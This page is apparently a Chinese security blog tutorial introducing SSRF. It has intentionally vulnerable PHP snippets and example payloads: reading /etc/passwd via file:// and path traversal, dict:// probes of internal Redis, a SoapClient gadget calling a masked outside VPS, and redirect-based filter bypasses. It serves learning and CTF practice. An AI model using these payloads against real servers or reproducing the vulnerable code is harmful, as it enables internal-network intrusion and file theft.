

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="shimm3r">
  <meta name="keywords" content="">
  
    <meta name="description" content="ssrf什么是ssrfSSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目">
<meta property="og:type" content="article">
<meta property="og:title" content="初识ssrf">
<meta property="og:url" content="http://shimm3r.github.io/2022/08/13/%E5%88%9D%E8%AF%86ssrf/index.html">
<meta property="og:site_name" content="shimm3r">
<meta property="og:description" content="ssrf什么是ssrfSSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。 SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small">
<meta property="og:image" content="https://image.3001.net/images/20210114/1610601312_5fffd36035478c41c2c18.png!small?1610601312696">
<meta property="og:image" content="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867">
<meta property="og:image" content="https://image.3001.net/images/20210114/1610601386_5fffd3aa565a51587d90c.png!small?1610601386867">
<meta property="og:image" content="http://shimm3r.github.io/image/2.png">
<meta property="og:image" content="https://image.3001.net/images/20210114/1610598043_5fffc69b181c82c561065.png">
<meta property="article:published_time" content="2022-08-13T03:32:17.000Z">
<meta property="article:modified_time" content="2022-08-18T05:45:03.172Z">
<meta property="article:author" content="shimm3r">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small">
  
  
  
  <title>初识ssrf - shimm3r</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"shimm3r.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>shimm3r&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="初识ssrf"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2022-08-13 11:32" pubdate>
          August 13, 2022 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          17k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          144 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">初识ssrf</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><h2 id="什么是ssrf"><a href="#什么是ssrf" class="headerlink" title="什么是ssrf"></a>什么是ssrf</h2><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p>
<p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。 例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p>
<p>如下图所示，服务器Ubuntu为WEB服务器，可被攻击者访问，内网中的其他服务器无法被攻击者直接访问。假设服务器Ubuntu中的某个WEB应用存在SSRF漏洞，那我们就可以操作这个WEB服务器去读取本地的文件、探测内网主机存活、探测内网主机端口等，如果借助相关网络协议，我们还可以攻击内网中的Redis、MySql、FastCGI等应用，WEB服务器在整个攻击过程中被作为中间人进行利用。<img src="https://image.3001.net/images/20210114/1610597995_5fffc66bd4875385a330e.png!small" srcset="/img/loading.gif" lazyload alt="image-20210112220229389"></p>
<p> 小知识点</p>
<p><strong>url构成</strong></p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">scheme:</span>//<span class="hljs-symbol">user:</span>pass<span class="hljs-variable">@host</span><span class="hljs-symbol">:port/path?query=value</span><span class="hljs-comment">#fragment</span><br></code></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left"><strong>Scheme:</strong></th>
<th><strong>&#x2F;&#x2F;</strong></th>
<th><strong>Login:password@</strong></th>
<th><strong>Address</strong></th>
<th><strong>:port</strong></th>
<th><strong>&#x2F;path&#x2F;to&#x2F;resource</strong></th>
<th><strong>?query_string</strong></th>
<th><strong>#fragment</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">协议，如http等</td>
<td>层级url标识符</td>
<td>身份验证</td>
<td>服务器地址</td>
<td>端口</td>
<td>文件路径</td>
<td>查询字符串</td>
<td>片段id（不重要）</td>
</tr>
</tbody></table>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="漏洞相关函数和类"><a href="#漏洞相关函数和类" class="headerlink" title="漏洞相关函数和类"></a>漏洞相关函数和类</h2><ul>
<li>file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。</li>
<li>readfile()：输出一个文件的内容。</li>
<li>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。</li>
<li>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</li>
<li>fopen()：打开一个文件文件或者 URL。</li>
</ul>
<p>上述函数函数使用不当会造成SSRF漏洞。 此外，PHP原生类SoapClient在触发反序列化时可导致SSRF。</p>
<p><strong>file_get_contents()</strong></p>
<p>file_get_contents() 函数将整个文件或一个url所指向的文件读入一个字符串</p>
<p>没有任何过滤时，构造类似<code>ssrf.php?url=../../../../../etc/passwd</code>的paylaod即可读取服务器本地的任意文件</p>
<p>测试代码：&#x2F;&#x2F;假设flag.txt在当前目录下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]; <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>],FILTER_VALIDATE_URL)) &#123; <span class="hljs-comment">//检测url是否正确</span><br>    <span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);  <br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$r</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/great\.ctf$/&#x27;</span>,<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123; <span class="hljs-comment">//要匹配到&#x27;great.ctf&#x27;</span><br>        <span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]); <br>        <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;  <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Error:Invalid URL; WhereIsSourceCode &quot;</span>;&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filter-var.html">filter_var()函数是通过指定的过滤器过滤一个变量。</a><br><a target="_blank" rel="noopener" href="https://www.runoob.com/php/filter-validate-url.html">FILTER_VALIDATE_URL过滤器</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/parse_url">parse_url是解析 URL，返回其组成部分</a></p>
<p>关键：利用file_get_contents读取文件</p>
<p>前置知识：php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。<br>我们就可以使用任意的非法协议如’0’,php如果识别不了就会当成一个目录,再此基础上可以在进行目录穿越，穿越到根目录读取flag.txt</p>
<p>payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">0</span>:<span class="hljs-regexp">//g</span>reat.ctf<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>flag.txt<br></code></pre></td></tr></table></figure>

<p>file_get_contents使用不存在的协议名导致目录穿越，实现SSRF</p>
<p>readfile()函数与其类似</p>
<p><strong>fsockopen()</strong></p>
<p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code>用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-number">80</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET / HTTP/1.1\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页</p>
<p>无法读取本地文件，建立的是tcp连接</p>
<p><strong>curl_exec()</strong></p>
<p>curl_init(url)函数初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// ssrf.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>	<span class="hljs-variable">$link</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>	<span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <span class="hljs-comment">// 创建新的 cURL 资源</span><br>	<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>	<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>	<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <span class="hljs-comment">// 设置 URL 和相应的选项</span><br>	<span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 抓取 URL 并把它传递给浏览器</span><br>	<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>); <span class="hljs-comment">// 关闭 cURL 资源，并且释放系统资源</span><br> <br>	<span class="hljs-comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span><br>	<span class="hljs-comment">// file_put_contents($filename, $result); </span><br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>构造<code>ssrf.php?url=www.baidu.com</code>即可成功触发ssrf并返回百度主页</p>
<p><strong>SoapClient</strong></p>
<p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的<code>__call</code>方法，那么<code>__call</code>便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">public</span> SoapClient <span class="hljs-type">:: SoapClient</span>(mixed $wsdl <span class="hljs-meta">[</span>，<span class="hljs-built_in">array</span> $options <span class="hljs-meta">]</span>)<br></code></pre></td></tr></table></figure>

<ul>
<li>第一个参数是用来指明是否是wsdl模式。</li>
<li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333&#x27;</span>, <span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://47.xxx.xxx.72:2333/aaa&#x27;</span>));<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>url写vps</p>
<p>监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据 仅限http&#x2F;https协议</p>
<p>但是如果这里的http头部还存在<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/202762.html#:~:text=CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%98%AF%E5%9B%A0%E4%B8%BAWeb%E5%BA%94%E7%94%A8%E6%B2%A1%E6%9C%89%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%81%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5%E4%B8%80%E4%BA%9B%E6%81%B6%E6%84%8F%E5%AD%97%E7%AC%A6%E3%80%82%20%E6%94%BB%E5%87%BB%E8%80%85%E4%B8%80%E6%97%A6%E5%90%91%E8%AF%B7%E6%B1%82%E8%A1%8C%E6%88%96%E9%A6%96%E9%83%A8%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E7%9A%84CRLF%EF%BC%8C%E5%B0%B1%E8%83%BD%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5%E6%88%96%E6%8A%A5%E6%96%87%E4%B8%BB%E4%BD%93%EF%BC%8C%E5%B9%B6%E5%9C%A8%E5%93%8D%E5%BA%94%E4%B8%AD%E8%BE%93%E5%87%BA%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%88%E7%A7%B0%E4%B8%BAHTTP%E5%93%8D%E5%BA%94%E6%8B%86%E5%88%86%E6%BC%8F%E6%B4%9E%EF%BC%88HTTP,Response%20Splitting%EF%BC%89%E3%80%82">crlf漏洞</a>，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p>
<h2 id="SSRF漏洞利用的相关协议"><a href="#SSRF漏洞利用的相关协议" class="headerlink" title="SSRF漏洞利用的相关协议"></a>SSRF漏洞利用的相关协议</h2><p>SSRF漏洞的利用所涉及的协议有：</p>
<ul>
<li><p>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</p>
</li>
<li><p>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
</li>
<li><p>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</p>
</li>
<li><p>http&#x2F;s协议：探测内网主机存活</p>
<p>​</p>
<p><strong>file协议</strong>(读取内网文件)</p>
<p>basic.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>	<span class="hljs-comment">// create curl resource </span><br>	<span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(); <br><br>	<span class="hljs-comment">// set url </span><br>	<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;handler&quot;</span>]); <br><br>	<span class="hljs-comment">//return the transfer as a string </span><br>	<span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>); <br><br>	<span class="hljs-comment">// $output contains the output string </span><br>	<span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <br><br>	<span class="hljs-comment">// close curl resource to free up system resources </span><br>	<span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>	<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>用file协议代替http协议或者https协议。在测试点输入<code>file:///etc/passwd</code>我们可以得到用户文件，我们也可以通过这样的方式获得其他文件。</p>
<p><strong>探测内网主机存活（http&#x2F;s协议）</strong></p>
</li>
</ul>
<p>域网IP地址范围分三类，以下IP段为内网IP段：</p>
<ul>
<li><p>C类：192.168.0.0 - 192.168.255.255</p>
</li>
<li><p>B类：172.16.0.0 - 172.31.255.255</p>
</li>
<li><p>A类：10.0.0.0 - 10.255.255.255</p>
<p>借助burpsuite的Intruder模块队xxx.xxx.xxx.<code>$a$</code>进行爆破</p>
<p>或者利用python脚本来探测（暂未研究</p>
<p> <strong>dict协议</strong>（扫描内网端口）</p>
</li>
</ul>
<p>用dict协议，<code>dict://127.0.0.1:6379/info</code>可获取本地redis服务配置信息。</p>
<p>还可以用<code>dict://127.0.0.1:6379/KEYS *</code>获取redis存储的内容</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//192.168.52.131:6379/info   // redis</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//192.168.52.131:80/info     // http</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//192.168.52.130:22/info   // ssh</span><br><span class="hljs-symbol">dict:</span><span class="hljs-comment">//127.0.0.1:6379/KEYS *  //获取redis存储的内容 </span><br></code></pre></td></tr></table></figure>





<h2 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a>一些姿势</h2><h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3><p>（1）短地址跳转绕过，这里也给出一个网址</p>
<p><a target="_blank" rel="noopener" href="https://urlify.cn/">https://urlify.cn/</a></p>
<p> (2)网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p>
<p>当我们访问：<a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a>时，实际访问的是<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a>。像这种网址还有<a target="_blank" rel="noopener" href="http://nip.io/">http://nip.io</a>，<a target="_blank" rel="noopener" href="http://sslip.io/">http://sslip.io</a>。（不知为啥这里测试不成功）</p>
<p>（3）奇淫巧技：将域名A类指向127.0.0.1</p>
